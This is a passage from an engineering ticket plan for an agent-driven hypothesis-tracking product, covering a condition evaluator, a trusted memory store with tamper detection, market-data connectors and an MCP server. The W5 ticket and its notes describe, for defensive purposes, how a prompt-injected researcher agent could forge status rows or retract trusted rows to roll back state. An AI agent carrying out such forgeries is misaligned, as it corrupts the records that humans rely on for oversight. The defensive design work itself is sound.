    the three; `drawdown_pct` × each of the three; `ratio_to`. Across the eleven, each of the four
    `op` values (`gt`, `gte`, `lt`, `lte`) appears at least once. `peak_since_live` is a **running**
    peak over `[L, t]` recomputed per observation; `trailing_n_days` is the mean over the
    half-open `[t - reference_days, t)`; only observations with `tMs >= liveAtMs` are considered.
  - **`nowMs` anchors the sustained window** — `(nowMs - sustained_days*86_400_000, nowMs]`, never
    `t_last`. A fixture proves it: a series that held the condition continuously and then stopped
    updating 60 days ago yields `indeterminate`/`insufficient_coverage`, **not** `tripped`. This
    single test is the difference between a product that flags a dead feed and one that
    invalidates a thesis on ancient data.
  - The coverage floor is `ceil(sustained_days * 0.6)` **counted over non-skipped observations
    only**, and it is checked before `holds`: a 30-day window containing 4 observations is
    `indeterminate`/`insufficient_coverage` even when all 4 hold. Insufficient coverage yields
    `indeterminate`, **never** `tripped` — absence of contrary evidence is not evidence.
  - `sustained_days == 0` trips only if `holds` at the most recent observation **and** that
    observation is newer than `staleness_days * 86_400_000` before `nowMs`; otherwise
    `indeterminate`/`stale_series`. `staleness_days` is spec-level, default `5`.
  - **`R <= 0` skips that observation** for `change_pct` and `drawdown_pct`, and `v_other == 0`
    skips it for `ratio_to` — a non-positive reference silently inverts the comparison, which is
    how a condition trips backwards. There is a fixture with a zero-crossing series.
  - `change_abs` is implemented and its doc comment names it the statistic to use on any series
    that can be `<= 0`.
  - `ratio_to` resolves `v_other` at the nearest `ratio_metric` point **at or before** `t` within
    `ratio_lookback_days`, never a hard-coded constant, and skips the observation when no such
    point exists. A fixture pairs a daily metric with a monthly one at `ratio_lookback_days: 62`
    and pins the resolved partner point for every observation.
  - **`Reason` is a closed enumeration and this is the complete list**: `stale_series`,
    `non_positive_reference`, `insufficient_coverage`, `no_observations`, `no_ratio_pair`.
    `no_ratio_pair` closes the hole the audit found (A13): the plan mandated the mixed-frequency
    fixture and defined no outcome for it. Do not add a sixth.
  - **Skip-exhaustion is per-reason.** If every observation of a condition is skipped, the
    condition is `indeterminate` with the reason of the skip — `non_positive_reference` for
    `R <= 0` or `v_other == 0`, `no_ratio_pair` for a missing partner point. When both kinds occur
    the reason is the one with the higher skip count, ties resolving to `non_positive_reference`.
    A metric with no observations at all is `indeterminate`/`no_observations`. There is a fixture
    per branch, including the tie.
  - **`sustained_days == 0` whose most recent observation is skipped is `indeterminate`, never a
    fallback to an earlier observation.** A fixture covers it.
  - Per condition: `value` is the statistic **at the most recent non-skipped observation inside the
    window** (for `sustained_days == 0`, at the most recent non-skipped observation overall), and
    `null` when every observation was skipped; `window_start_ms`/`window_end_ms` are
    `(nowMs - sustained_days*86_400_000, nowMs]`, and `[nowMs, nowMs]` when `sustained_days == 0`;
    `observations_in_window` is the count of **non-skipped** observations — the same count the
    coverage floor tests. One fixture pins all four for a window holding one skipped and three
    counted observations. These are the numbers a human reads on W14's condition table when
    deciding a verdict, so "the statistic somewhere in the window" is not good enough.
  - `metrics[].realised_change_pct` is `change_pct` from `value_at_live` to the most recent
    observation, `null` when there are no observations or the reference is `<= 0`.
    `metrics[].stale` is true when there is no observation or the newest is older than
    `staleness_days` before `nowMs`, with `stale_reason` `no_observations` or `stale_series`
    accordingly, and `null` when not stale.
  - **The support score is computed from `metrics[].realised_change_pct`**, so the number the UI
    shows and the number the score uses cannot disagree: `s = +1/0/-1` per § "The support score"
    using `flat_band_pct` (default `2.0`), `s = 0` for a metric with `realised_change_pct === null`,
    and `support_score = Σ weight_i * s_i`, which lies in `[-1, 1]` because W3 already forces the
    weights to sum to 1. A test asserts the bound on a spec whose every metric scores `-1`.
  - **Determinism is tested, not assumed:** one test stubs `Date.now` to throw and asserts
    `evaluate` still returns, and asserts two calls with identical arguments are deep-equal.
  - `evaluate.ts` imports only type declarations from `./spec.js` and nothing else from the
    repo — a test asserts the module's import list, so no I/O can creep in later.
- **TDD:** yes.
- **Validation:**
  - `cd api && yarn typecheck`
  - `cd api && yarn test src/hypothesis/evaluate` — must report **0 skipped** and a non-zero test
    count; every criterion above is a fixture in this file, so a green run with a skipped test is
    a failed ticket. Confirm the eleven grid fixtures, the dead-feed fixture, the zero-crossing
    fixture, the mixed-frequency fixture and the tie fixture appear by name in the output
    (`yarn test src/hypothesis/evaluate --reporter=verbose`).
- **Depends on:** W3
- [x] done
- Notes: **Delivered on branch `W4-condition-evaluator`, commit `78b4f14`, based on
  `W3-spec-validator`. No fix round.** Orchestrator re-ran the Validation on 2026-08-21:
  `yarn typecheck` clean, **138 api tests** green (44 evaluator fixtures, every number hand-computed
  in the test rather than produced by the implementation).
  **The `Reason` vocabulary is SIX, not five — orchestrator decision, forced by this ticket's own
  criteria.** § "Every condition result carries a reason" lists five; W4's behavioural criteria
  require `no_observations` in two separate places. Five is unsatisfiable whichever five you pick,
  so the closed list is the union:
  `condition_tripped | insufficient_coverage | non_positive_reference | stale_data |
  no_ratio_pair | no_observations`, with **`stale_data`**, never `stale_series` (R67). See **R71**.
  **Four semantics W4 had to decide that change the numbers**, all now pinned by fixtures and all
  worth reading before W10, W11 or W14: (1) **staleness is `nowMs - t_last > S`** — the plan
  specified the boundary twice with opposite inclusivity and they disagree at exactly
  `t_last == nowMs - S`, which is precisely where a daily series evaluated by a daily cron sits
  (**R72**). (2) An observation whose `trailing_n_days` window is **empty** — a guaranteed
  occurrence for the first post-go-live observation of every such condition, since the window is
  half-open `[t-N, t)` — is skipped as `insufficient_coverage` (**R73**). (3) **The trailing mean is
  live-only and the ratio partner is not**: lookbacks behind `liveAtMs` are forbidden for
  `trailing_n_days` and permitted for `ratio_to`, because a mixed-frequency ratio would otherwise be
  `no_ratio_pair` for the first month of every hypothesis (**R74**). (4) The coverage floor is
  `ceil(sustained_days * 0.6)` counted over **non-skipped** observations only.
  Exports for W8/W10/W11/W14 and the report frame: `Point`, `UnixMs`, `Reason`, `ConditionState`,
  `ConditionResult`, `MetricResult`, `EvaluationResult`, `MS_PER_DAY`. Import them; do not
  redeclare — a `{t, v}` shape downstream is a silent `NaN`, not a type error.

### W5: Lifecycle, trusted store and tamper detection   [Status: done | Model: opus]
- **Scope:** The six-state machine with per-hypothesis serialisation, and reading/writing
  hypotheses as **trusted** memories per § "The trust model". This ticket owns the trust primitives
  the rest of the product is graded against: `TRUSTED_KINDS`, `isTrusted()`, the session index, the
  retraction rule and the `Tamper` shape. W15 later re-exports them through
  `api/src/report/kinds.ts`; it does not redefine them. Test names are prefixed `lifecycle_` and
  `store_`.
- **Repo:** agent-wolf
- **Files:** create `api/src/hypothesis/lifecycle.ts`, `api/src/hypothesis/store.ts`,
  `api/src/hypothesis/lifecycle.test.ts`, `api/src/hypothesis/store.test.ts`,
  `api/src/hypothesis/__fixtures__/` (Orange response bodies captured verbatim from a running O11
  build — see the retraction criterion). `api/src/hypothesis/store.ts` is shared with W10, W15 and
  W22 in that order (§ "Parallelism and file ownership"); W5 runs first and no other ticket may
  hold it concurrently.
- **Acceptance criteria:**
  - **The legal transition set is exactly these eight ordered pairs and no others:**
    `draft → live`, `draft → archived`, `live → challenged`, `live → archived`,
    `challenged → confirmed`, `challenged → invalidated`, `challenged → archived`, and
    `challenged → live` — the last because a human accepting an amendment must return the
    hypothesis to daily research; without it every amended hypothesis is stuck at `challenged`
    with its schedule still firing and no route back (owner decision **B3**).
  - **All six self-pairs are no-ops**, not errors and not writes (**B3**): they return the current
    state and append **no** memory. This is what makes W10's idempotence criterion mean anything —
    a hypothesis already `challenged` re-entering `challenged` must neither throw nor re-notify.
    A test asserts the Orange client received no `POST /agent/memories` for a self-pair.
  - `confirmed`, `invalidated` and `archived` are terminal: every non-self transition out of them
    throws. The table test is **exhaustive over all 36 ordered pairs**, asserting exactly three
    buckets — 8 legal-and-effective, 6 self no-ops, 22 illegal — and every illegal one throws a
    typed `conflict` `WolfError` naming **both** states in its message.
  - Transitions are serialised per hypothesis id by an in-process async mutex, and the current
    state is **re-read from Orange inside the critical section**. A test drives two concurrent
    transitions from the same starting state and asserts exactly one wrote and the other was
    rejected as illegal — not that both appended and the later silently won. Serialisation is
    per-id: a test asserts two different ids proceed concurrently.
  - **`TRUSTED_KINDS` is an exported frozen set containing exactly `hypothesis`,
    `hypothesis-spec`, `verdict`, `evaluation`, `report-template` — enumerated, never counted.**
    A test asserts membership for all five and non-membership for `research-note`,
    `spec-amendment`, `hypothesis-spec-candidate`, `report-candidate`, `report`,
    `report-amendment`. *(An earlier draft said "the five kinds" while the vocabulary listed six;
    an executor enumerating the wrong set makes every memory W10 writes untrusted, the board
    silently shows no `support_score`, and no test in either ticket fails. Do not reintroduce a
    count.)*
  - **`isTrusted(memory, sessionIndex)` applies all three clauses of § "The trust model":** empty
    provenance (`created_by_worker === "" && created_by_session === ""`), **and** kind in
    `TRUSTED_KINDS`, **and** `name` matching an existing `hyp-<id>` session in the index. A test
    asserts a memory passing only the first two clauses is **not** trusted — that is the
    `ApplyTopology` forgery path (R24), and the session clause is the one that cannot be forged
    from inside a container.
  - A test appends a forged `status=confirmed` memory carrying a worker name and asserts the
    reported status is unchanged and a `Tamper` with `reason: "forged_row"` is produced.
  - **The board read is the two-step of § "The trust model":** one
    `GET /agent/memories?selector=kind%3Dhypothesis&latest_per=name&limit=100&include_retracted=1`,
    and a per-name follow-up **only** for ids whose newest row **cannot settle the hypothesis** —
    untrusted, retracted by Wolf, or absent. A test asserts the all-trusted case
    issues exactly **one** memory request (the session index is a separate request and is counted
    separately).
  - **The authoritative index of hypotheses is the session list, not memory.** It is read as
    `GET /agent/sessions?user_email=*&worker=interviewer&limit=200`, paginating on `offset` until
    a page returns fewer than `limit` rows, then filtered to names matching `hyp-*`. Both filters
    are load-bearing and both are server-side: `user_email=*` because an API key's synthetic email
    matches no session row, and `?worker=` (`go/httpapi/history.go:123`) because the list is
    ordered `updated_at DESC` with a default limit of 50 (`go/httpapi/history.go:103`,
    `go/agentdb/sessions.go:407`) and the daily tick sessions — which carry
    `worker=researcher-<id>` — would otherwise push idle `draft` hypotheses off the "authoritative"
    index entirely, which is the exact failure the trust model exists to prevent. A test asserts
    120 sessions across three pages all appear in the index.
  - **Retraction is handled, and this is the criterion that matters.** For any anomaly, and always
    on the detail read, the store queries with `include_retracted=1` (ticket O11) and resolves each
    row from the **full** `retracted_by` list: a row counts as retracted iff **at least one**
    retraction of it has empty provenance; retractions with non-empty provenance are ignored for
    state and surfaced as `Tamper{reason: "hostile_retraction"}`. Reading only the newest
    retraction lets an attacker **resurrect** state Wolf legitimately withdrew by appending their
    own retraction on top of Wolf's (owner decision **B5**).
  - A test appends a `retracts=<trusted-id>` memory written by a session, asserts the reported
    status is unchanged, and asserts a `Tamper` naming the retractor. **This is the test that
    matters** — the forged-newer-row test passes even against a store that retraction defeats
    (`notRetractedSQL`, `go/agentdb/memories.go:284-288`, correlates on the retracted row's id and
    project only and never checks who wrote the retraction).
  - The `include_retracted=1` fixtures are response bodies **captured verbatim from a running O11
    build** and committed under `api/src/hypothesis/__fixtures__/`, not hand-shaped — the two
    criteria above are otherwise graded entirely against JSON this ticket invented.
  - **`Tamper` is exactly the shape pinned in § "Shared shapes"**:
    `{ reason: "forged_row"|"hostile_retraction"|"cross_hypothesis_write", written_by_worker,
    written_by_session, memory_id }`, where `memory_id` is the **offending** row, not the trusted
    one, and **at least one** of the two provenance fields is non-empty — **not** exactly one.
    Orange sets **both** for any session that has a worker (`go/cmd/agentd/mcpserver.go`), which is
    every researcher tick and every interview session too, since W8 creates those with
    `worker: "interviewer"`. W5 proved this against two independently captured fixtures and
    implements the `at least one` form; the plan previously said `exactly one` and was simply wrong
    about the engine (**R89**). X1's tamper-resistance spec must NOT assert the `exactly one` form.
    The field carried on a
    hypothesis is `tamper?: Tamper[]` — an array, because a forged row and a hostile retraction can
    be present at once and X1's `tamper-resistance.spec.ts` asserts on the two attacks separately.
    W8's board, W13's banner, W14's detail page and X1 all read this shape and no other.
  - **Ids are the bare 8 lowercase hex characters**, generated, never derived from user text; the
    `hyp-` prefix belongs to the session name and to nothing else. A test asserts no value the
    store emits or queries with ever matches `hyp-hyp-` — the doubled prefix makes the trust rule's
    session clause never match and every hypothesis read as untrusted (§ "Vocabulary").
  - Every trusted write goes through `POST /agent/memories` (O7) and expects **201** (R36); the
    request body carries **no** `created_by_worker` or `created_by_session` — O7 rejects those
    `400` rather than ignoring them — and a test asserts the serialised body contains neither key.
  - **The owner slug mapping is total**: lowercase, `@` → `-at-`, every remaining character outside
    `[a-z0-9._-]` → `-`, collapse runs of `-`, trim to 63, strip leading/trailing non-alphanumerics
    — **and if the result is empty or does not begin with `[a-z0-9]`, prefix `u-` and append the
    first 8 hex characters of the SHA-256 of the lowercased address**, so every possible input
    yields a legal label. `kai+test@gmail.com`, `KAI@BadCode.dev` and `"+@-.com"` all produce valid
    labels; a property test over 1000 random strings asserts every output matches
    `^[A-Za-z0-9]([-A-Za-z0-9_.]*[A-Za-z0-9])?$` (`go/agentdb/labels.go:33-34`) and is ≤63
    characters. The full address is kept in the memory content, never in a label.
  - The title is line 1 of the content and is parsed back from the search snippet, which is **500
    characters, not 500 bytes** — `substring(content, 1, 500)` on a `text` column is
    character-based (`go/agentdb/memories.go:35,451-452`), so a multibyte character is never split
    and the snippet may exceed 500 bytes of UTF-8. Tests cover: a title shorter than the snippet; a
    first line longer than 500 characters, where the title is the truncated prefix and is flagged
    as truncated so the UI cannot claim it is complete; and a multibyte title, asserting the
    snippet's byte length exceeds 500 while the parse is exact. Do not write a test for a
    mid-character split: the server cannot produce one.
- **TDD:** yes.
- **Validation:**
  - `cd api && yarn typecheck`
  - `cd api && yarn test src/hypothesis/lifecycle src/hypothesis/store` — must report **0 skipped**
    and a non-zero test count. Every criterion above is a case in one of these two files; a green
    run that skipped one is a failed ticket.
  - `cd api && yarn test src/hypothesis/lifecycle --reporter=verbose` must show the 36-pair table
    naming all three buckets, and `… src/hypothesis/store --reporter=verbose` the forged-row,
    hostile-retraction, three-page-index and doubled-prefix cases by name.
  - `ls api/src/hypothesis/__fixtures__` is non-empty, and its README records the running O11 build
    (commit sha) each body was captured from.
- **Depends on:** W2, W4, O11 *(the trusted store cannot detect retraction without O11's
  `include_retracted=1` and its `retracted_by` **array**; W2's client must expose the session
  **list** with `worker=`/`offset` and the `include_retracted` read — neither is in W2's route list
  as written, and W2's list is declared exhaustive and closed, so this is a cross-ticket
  requirement, not something W5 may add to the client itself)*
- [x] done — verified 2026-08-21, 17/17 criteria, one fix round (the resurrection hole)
- Notes: **Implemented, FAILED independent verification, fixed, re-verified 2026-08-21 — 17 of 17
  criteria PASS after one fix round.** Branch `W5-lifecycle-trusted-store`, commits `…` ending
  `6f748fe`, merged to `main`. **The verifier found the resurrection attack succeeding on the
  board.** The board's fast path read without `include_retracted`, so Orange's `notRetractedSQL`
  hid Wolf's newest state row and `latest_per` handed back the OLDER trusted row beneath it —
  which passes `isTrusted()` and was accepted as authoritative with no tamper flag. A
  prompt-injected researcher that merely **retracted** Wolf's newest `kind=hypothesis` row rolled
  the board back to the previous status, silently, on the exact surface W8's board and W13's banner
  render — while the detail read was correct, so the two surfaces disagreed. This was not an
  implementation slip: the implementation followed the ticket's literal board-URL criterion, and
  the root cause was a contradiction inside the plan. Fixed by one query parameter; the plan's
  § "The trust model" and this ticket's criterion are both amended (**R90**). Two minor defects
  accepted: the board and the detail read can still report different *tamper arrays* for the same
  hypothesis (a plan consequence of the follow-up rule, not a code error — W8/W13 will under-report
  relative to W14), and the transition `KeyedMutex` is per store **instance**, so serialisation
  holds only if wolf-api constructs exactly one `HypothesisStore` per process — W8, W9 and W10 each
  construct their own dependencies and nothing enforces it. Five fixtures were **captured live**
  from `agentd` at `af0e0cb` in mock mode, not hand-shaped. 28 guesses. Found **R88**, **R89**,
  **R90**, and a fail-open in W2's `mapMemorySearchRow` (a row that OMITS both provenance fields
  maps to empty strings and reads as trusted — unreachable today because agentdb tags both without
  `omitempty`, suggested owner W15).
### W6: Market-data providers and normaliser   [Status: done — FRED closed by W6b; Stooq still deferred, R56 | Model: sonnet]
- **Scope:** FRED and Stooq connectors — each exposing **both `search(query)` and `fetch(...)`** —
  the normaliser to the canonical dataset CSV, the shared data-row counter, and a TTL cache.
  `search` is in scope here and not in W7: W7 only exposes over MCP what this module implements,
  and an earlier draft left the search implementation owned by nobody. Test names are prefixed
  `marketdata_`.
- **Repo:** agent-wolf
- **Files:** create `api/src/marketdata/{fred,stooq,normalise,cache}.ts` and a `.test.ts` beside
  each; `api/src/marketdata/__fixtures__/` holding the recorded responses and
  `__fixtures__/stooq-tickers.json`; `api/src/marketdata/__fixtures__/README.md` recording the
  exact command each fixture was captured with. **This ticket does not touch `api/src/config.ts`,
  `.env.example` or `api/src/app.ts`** — they are owned by W1/W16/W21 (§ "Parallelism and file
  ownership"), and the criteria below are written so it does not need to.
- **Acceptance criteria:**
  - **The FRED endpoint is the keyed JSON API on `api.stlouisfed.org`** —
    `/fred/series/observations` and `/fred/series/search` — never `fredgraph.csv`. The keyless CSV
    path has no search endpoint and no metadata, which `series_search` requires (§ "Pinned
    technology choices"). The key is the variable **`FRED_API_KEY`** (owner decision **B2**).
  - **Nothing under `api/src/marketdata/` reads `process.env`.** Each connector and the cache is
    constructed with explicit options — `createFredClient({ apiKey, fetchImpl })`,
    `createCache({ ttlMs, now })` — so the module is unit-testable and needs no edit to the
    config file it does not own. Wiring `FRED_API_KEY` and the cache TTL into `WolfConfig` and
    `.env.example` is a one-line change owned by W1/W16/W21: **request it from the orchestrator
    and record the request in Notes**; a missing key must surface as `WolfError.misconfigured`
    naming `FRED_API_KEY`, raised at construction, not at first call. A test asserts that.
  - **Fixtures are recorded real responses**, not hand-written, committed under
    `__fixtures__/` with the recording command in the sibling `README.md`. Each connector is tested
    against its own fixture with `undici` `MockAgent` and `enableNetConnect(false)`, so no test can
    reach the network. **If no FRED key is available to the executor, recording the fixture is a
    blocked step: log it in the Discovered Issues Log and stop — do not hand-write a substitute.**
  - **Each connector exposes `search(query)`.** FRED's is `/fred/series/search`, mapping
    `title`, `units`, `frequency`, `observation_start` and `observation_end` onto the
    `{ source, id, title, unit, frequency, first, last }` shape of § "Market-data MCP tools".
    **Stooq has no search API**: its `search` matches a committed static ticker table
    (`__fixtures__/stooq-tickers.json`, covering at least the US equity and ETF symbols the
    interviewer prompt suggests) case-insensitively on symbol and name, with `unit` always `"USD"`,
    `frequency` always `"daily"`, and `first`/`last` **`null`** rather than synthesised by fetching
    the series. A test asserts a Stooq search issues **zero** HTTP requests.
  - **Stooq's value column is `Close`** — its daily CSV is `Date,Open,High,Low,Close,Volume` and
    there is no adjusted column to prefer. FRED's is the `value` string of each observation.
    A date-only provider timestamp (`YYYY-MM-DD`, which both providers emit) becomes
    `YYYY-MM-DDT00:00:00Z`.
  - **FRED's missing-value sentinel `.` omits the row entirely; it never becomes `0`.** A fixture
    contains one and pins the omission.
  - **`normalise()` emits the canonical dataset CSV byte-for-byte** as pinned in § "The canonical
    dataset CSV": header exactly `timestamp,value`, RFC3339 in UTC, ascending by timestamp, `LF`
    line endings, one metric per file, a single terminating `LF` after the last data row and no
    blank line after it. A test asserts the **exact byte string** for a two-row fixture — nothing
    enforced this before and the failure is silent: a `t,value` header makes W10's poller read zero
    observations from a legitimately written dataset with no error anywhere.
  - **`countDataRows(csv)` lives in `normalise.ts` and implements `max(0, N-1)`** over
    LF-terminated lines, exactly as O6a's `row_count` does — header-only is `0`, empty is `0`, a
    file with no trailing newline still counts its last line, and it is never `-1`. W7's
    `series_fetch` reports `rows` from this function and nothing else, so `series_fetch`'s `rows`
    and a later `dataset_put`'s `row_count` cannot disagree about an unmodified file. Six boundary
    tests: empty, header-only, one row, one row without a trailing newline, two rows, and a file
    ending in a blank line.
  - Output is **deduplicated by timestamp keeping the LAST occurrence in provider order** — FRED
    restatements re-emit a date with a corrected value and the corrected one must win, which is the
    same fact that made § "Decisions" choose replace-over-append. A fixture contains a duplicated
    date with two different values and pins the survivor. **No gap filling and no interpolation**,
    ever: a missing day is a missing observation, and W4's coverage floor is what reads it.
  - **Errors are typed with this exact mapping**, because W10's poller and W7 branch on it: an
    upstream `404`, or FRED's "series does not exist" error body, is `not_found`; a `5xx`, a
    connection failure, or a timeout is `unavailable` (**retryable**); a missing or rejected
    credential is `misconfigured` naming `FRED_API_KEY`; any unrecognised throw is `internal`,
    **never** `unavailable` (R39) — classifying our own bug as retryable makes the poller retry a
    crashing path every tick forever. There is a test per branch, and one asserting a thrown
    error's serialised form contains no key material.
  - The cache honours a TTL (**default 3600s**, overridable per instance and, once an owning ticket
    adds it, by `WOLF_MARKETDATA_CACHE_TTL`), is keyed by `(source, id, from, to)`, and is
    bypassable per call. Expiry is tested with an injected clock, not a real timer.
- **TDD:** yes.
- **Validation:**
  - `cd api && yarn typecheck`
  - `cd api && yarn test src/marketdata` — must report **0 skipped** and a non-zero test count.
    Every criterion above is a case in this directory.
  - `cd api && yarn test src/marketdata --reporter=verbose` must name the `.`-sentinel case, the
    duplicate-date case, the exact-bytes case, the six `countDataRows` boundaries, the
    zero-HTTP Stooq search and each of the four error branches.
  - `git diff --name-only main -- api/src/config.ts api/src/app.ts .env.example` prints nothing —
    this ticket must not edit files it does not own.
- **Depends on:** W1
- [x] done — everything the environment allows; two criteria deferred, see R55/R56
- Notes: **Delivered on branch `W6-market-data-providers`, commit `37b27d2`, based on
  `W1-wolf-repo-scaffold` (not merged to `main`). One fix round.** Orchestrator re-ran the
  Validation on 2026-08-21: `yarn typecheck` clean, `yarn test src/marketdata` green (**53 tests**,
  0 skipped), the ownership diff prints nothing against the corrected base, and no file under
  `src/marketdata/` reads `process.env` (the six matches are comments asserting that it does not).
  **Two acceptance criteria are UNPROVEN and deferred, not met: the `"."` missing-value-sentinel
  omission and FRED's `search()` field mapping, both of which the ticket requires be pinned against
  a recorded real response.** Neither fixture could be recorded — see R55 (no `FRED_API_KEY`) and
  R56 (stooq.com now serves a JS proof-of-work challenge, not CSV). The executor correctly refused
  to hand-write substitutes, including when an orchestrator instruction wrongly asserted Stooq was
  recordable on the strength of a 200 status code. The connectors are implemented against each
  provider's published shape and every branch reachable without a fixture is tested.
  Two more things later tickets inherit. **The default Stooq ticker table is
  `api/src/marketdata/stooq-tickers.ts`, a compiled TS module — NOT a JSON file under
  `__fixtures__/`.** `api/`'s build is plain `tsc` (`rootDir src` → `outDir dist`), which never
  emits non-`.ts` files, and the Dockerfile copies only `dist/`, so the original JSON-file version
  `ENOENT`-ed from the built image the first time `createStooqClient()` ran without injected
  tickers — which is exactly what W7 does. See **R69**. **The HTTP timeout default is 10s**,
  exposed as a `timeoutMs` constructor option on both clients; no env var owns it (**R68**).
  **Config-wiring request to the orchestrator (owner of `api/src/config.ts`,
  `.env.example`, `api/src/app.ts` — W1/W16/W21):** wire two variables into `WolfConfig` —
  `FRED_API_KEY` (string, required for a live FRED client; `createFredClient` already throws
  `WolfError.misconfigured` naming it if empty, so the config layer only needs to pass the value
  through) and **`WOLF_MARKETDATA_CACHE_TTL_SECONDS`** (integer seconds, default `3600`) — note
  the `_SECONDS` suffix: the ticket text names `WOLF_MARKETDATA_CACHE_TTL`, but the house rule in
  § "Parallelism and file ownership" requires every duration variable to end in `_SECONDS` and
  hold a plain integer count of seconds (R49 already lists `WOLF_MARKETDATA_CACHE_TTL_SECONDS`,
  with the suffix, as a name pinned nowhere — this ticket's code and this Note are that pin).
  `createCache({ ttlMs, now })` takes milliseconds, so the wiring ticket's one line is
  `ttlMs: config.marketDataCacheTtlSeconds * 1000`, done once where the cache is constructed
  (W7), not inside `cache.ts` — `cache.ts` never reads `process.env` or performs unit conversion
  itself, by design (see its header comment).

  **Both fixture recordings are BLOCKED — see Discovered Issues Log entries R55 (FRED) and R56
  (Stooq)**, added by this ticket. In short: no `FRED_API_KEY` was available to this executor
  (owner decision **B2** assumed one would be — it was not, in this environment), and
  stooq.com's daily-download endpoint now answers every plain request with a client-side
  JS proof-of-work challenge page (HTTP 200, HTML) instead of CSV, which was discovered only by
  inspecting the response body — the pre-ticket reachability check looked at the status code
  only. Everything not dependent on those two recordings (the Stooq connector including its
  `search()` against the committed `stooq-tickers.ts` table, `normalise()`, `countDataRows()`,
  the TTL cache, and the full error taxonomy for both connectors including a bounded
  `timeoutMs`) is implemented and tested in full — see `__fixtures__/README.md` for the exact
  commands that would record each fixture once unblocked.

  **R55 CLOSED 2026-08-21 by W6b, branch `W6b-fred-fixtures`, commit `ed8f6c5`, no fix round.**
  The repository owner supplied a real FRED API key, and both FRED fixtures are now **recorded real
  responses** — `__fixtures__/fred-observations-dgs10.json` (11 observations spanning two market
  holidays, so it carries two genuine `"."` sentinels) and `__fixtures__/fred-search-treasury.json`
  (5 results under FRED's real, misspelled `seriess` key), each with its recording command and date
  in the sibling README, and the key shown only as `$FRED_API_KEY`. The two deferred criteria — the
  `"."` omission and `search()`'s field mapping — are now pinned against those responses.
  **The real shape matched FRED's published documentation**: the only change to `fred.ts` was
  replacing the comments that said the mapping was unverified. Orchestrator confirmed 87 api tests
  green, no credential anywhere in the diff, and no Stooq file touched.
  **R56 remains OPEN.** stooq.com still answers with a JavaScript proof-of-work challenge instead of
  CSV, `parseStooqCsv` is still unit-tested against Stooq's published shape only, and solving or
  circumventing that challenge is out of scope.

### W7: Market-data MCP server and the series download route   [Status: done | Model: opus]
- **Scope:** An HTTP MCP server named **`wolf`** exposing `series_search` and `series_fetch`,
  authenticated by `WOLF_MCP_TOKEN`, **plus the route that actually serves the bytes those tools
  point at** — `GET /series/download?token=…`. The download route is in scope here because no
  other ticket builds it: W11's `api/src/routes/series.ts` is a different resource (signed-in,
  per-hypothesis, JSON points over Orange *datasets*), and a `download_url` pointing at nothing
  would first surface nine tickets later, inside a container, at X1. Test names are prefixed
  `mcp_`.
- **Repo:** agent-wolf
- **Files:** create `api/src/mcp/server.ts`, `api/src/mcp/tools.ts`,
  `api/src/mcp/seriesdownload.ts`, `api/src/mcp/server.test.ts`,
  `api/src/mcp/seriesdownload.test.ts`.
  **This ticket does not touch `api/src/config.ts`, `.env.example`, `api/src/app.ts` or anything
  under `web/`** — all are owned by other tickets (§ "Parallelism and file ownership"), and the
  criteria below are written so it does not need to.
- **Acceptance criteria:**
  - **The MCP server name is `wolf`**, so the tools are `mcp__wolf__series_search` and
    `mcp__wolf__series_fetch`. W12's researcher prompt and X1's mock-model script use that exact
    form; a different server name silently renames every tool the prompt calls.
  - **The credential is sent as the bare header `X-Wolf-Mcp-Token: <token>`, with no scheme
    prefix**, and compared in constant time. `Authorization: Bearer …` **cannot** work: Orange
    validates MCP header values as whole-value `${VAR}` references only and rejects
    `"Bearer ${WOLF_MCP_TOKEN}"` outright (`go/agentdb/sessions.go:55,88-89`), so W12's project MCP
    config can carry `{"headers": {"X-Wolf-Mcp-Token": "${WOLF_MCP_TOKEN}"}}` and nothing else.
    A test sends `Authorization: Bearer <valid token>` **with no `X-Wolf-Mcp-Token`** and asserts it
    is still rejected, so the two schemes cannot silently diverge from W12's.
  - **An unauthenticated or wrongly-authenticated `/mcp` call is rejected before any provider is
    touched**, and the test asserts the connector was **not called**. The graded cases are: no
    header at all; an empty header; a wrong token of the same length; a wrong token of a different
    length; and the `Authorization: Bearer` case above.
  - **Neither tool returns CSV in its result body.** A test asserts the serialised tool result
    contains neither the string `timestamp,value` nor any data row of the fixture. Both tool
    descriptions instruct the model to `curl` the URL to a file, not to echo the URL and not to
    print the file's contents — the same hazard § "The dataset atom" states for `dataset_get`: the
    bytes stay out of context, the credential in the URL does not.
  - `series_search(query, source?)` returns `{ results: [{ source, id, title, unit, frequency,
    first, last }] }` from W6's connectors, with `first`/`last` typed `string | null` and the tool
    description stating that Stooq results omit them.
  - `series_fetch(source, id, from?, to?)` returns
    `{ download_url, expires_at_sec, rows, unit, source, id }`. **`expires_at_sec` is unix
    seconds** — § "Interfaces" writes it `expires_at`, which § "Shared shapes" forbids ("encode the
    unit in every type you write"); the suffixed name is the one to ship. `rows` comes from W6's
    `countDataRows` and nothing else, so it cannot disagree with the `row_count` a later
    `dataset_put` computes over the same bytes.
  - **W7 owns the byte route: `GET /series/download?token=<t>`**, mounted on wolf-api **outside**
    the `/api` prefix and outside the session-cookie auth W8 installs — a session container has no
    cookie and reaches wolf-api directly at `http://<dind-gateway>:<port>`, not through nginx. It
    is authenticated **solely** by the `token` query parameter (a query parameter, not a header:
    the agent uses `curl`, and a header would force it to compose one). Responses set
    `Content-Type: text/csv`, `X-Content-Type-Options: nosniff`, and a body byte-identical to W6's
    `normalise()` output for that series.
  - **The token is an HMAC-SHA256 over `(source, id, from, to, exp)`** signed with a secret
    supplied to the server factory (to be wired as `WOLF_SERIES_TOKEN_SECRET` by whichever ticket
    owns `config.ts`), default TTL **300s** (likewise `WOLF_SERIES_URL_TTL`). It is single-series
    scoped, and there is a test per rejection: a token minted for `(fred, DGS10)` used to fetch
    `(stooq, avav.us)` is **403**; an expired token is **403**; a token whose payload was edited is
    **403**; a missing or malformed `token` parameter is **403**. All four bodies are byte-identical
    — the route is not an existence oracle.
  - **The route is stateless — the token IS the request.** On a download it re-resolves
    `(source, id, from, to)` through W6's connector and cache and normalises again; there is no
    server-side blob store, nothing to reap and no second copy of the bytes to drift. A test
    asserts a download against a warm cache issues **zero** HTTP requests, so the normal case is a
    cache hit and the `rows` a preceding `series_fetch` reported matches the body. A cache miss
    that re-fetches a restated series may return a different row count; that is not an error.
  - **The download URL's origin comes from the resolved MCP URL the server factory is given**
    (`config.mcpUrl`), never from `process.env.WOLF_MCP_URL` directly, and this module runs no
    second gateway probe: an explicit `WOLF_MCP_URL` wins, otherwise `api/src/config.ts` discovers
    the DinD gateway at boot (**R43**, and W1 shipped it — `config.mcpUrl` and `config.mcpUrlSource`
